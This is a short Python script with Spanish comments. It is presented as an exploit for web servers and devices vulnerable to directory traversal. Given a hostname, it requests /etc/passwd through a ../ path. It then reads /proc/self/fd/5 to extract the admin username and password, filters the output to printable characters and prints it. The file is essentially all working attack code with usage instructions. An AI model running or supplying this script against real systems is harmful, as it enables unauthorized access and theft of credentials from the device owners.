#!/usr/bin/python
# Exploit para extraer por http la password en la carperta Linux /etc/passwd, en paginas vulnerables a directorio traversal.
# Usuario por defecto admin
# USO - ./dir.py <hostname/IP>
import requests
import re
import sys
 
host = sys.argv[1]
r=requests.get('http://'+ str(host)+ ':80/../../../../../../../etc/passwd')
if r.status_code == 200:
 print "Grabbing /etc/passwd for grins."
 print r.content
 # Request /proc/self/fd/5
 pwn=requests.get('http://'+ str(host)+ ':80/../../../../../../../proc/self/fd/5')
 print " Username and password is in this jumble of strings. Default username is admin\n\n"
 
 # Regex out everything except characters in ascii range 32-136 or    #x20-x73 
 print re.sub("[^\x20-\x7E]", '', pwn.content)
else:
 print str(r.status_code) + " Error"
 exit(0)
